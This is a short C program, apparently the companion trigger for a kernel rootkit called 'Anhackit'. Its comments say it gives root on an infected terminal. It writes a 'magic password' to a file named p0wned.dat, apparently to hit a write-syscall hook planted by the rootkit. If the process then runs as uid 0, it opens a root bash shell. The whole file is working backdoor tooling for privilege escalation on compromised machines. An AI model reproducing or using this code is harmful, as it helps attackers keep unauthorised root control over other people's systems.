#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>

/*
	Anhackit magic task - Developed by Anhackin

	Use this code to become the root on an
	infected anhackit terminal
*/

int main(int argc, char* argv[]) {
	//Need help?
	if(argc < 2) {
		printf("Usage: %s <magic_password>\n", argv[0]);
		return 0;
	}

	//Awake anhackit
	int fd = open("p0wned.dat", O_CREAT | O_WRONLY);
	if(fd != -1) {
		write(fd, argv[1], strlen(argv[1])); //Here is the write sys call ;)
		close(fd);
	}

	//Got root?
	if(getuid() == 0) {
		printf("Hello, uid=%d(root)!\n", getuid());
		execl("/bin/bash", "bash", 0);
	}

	return 0;
}
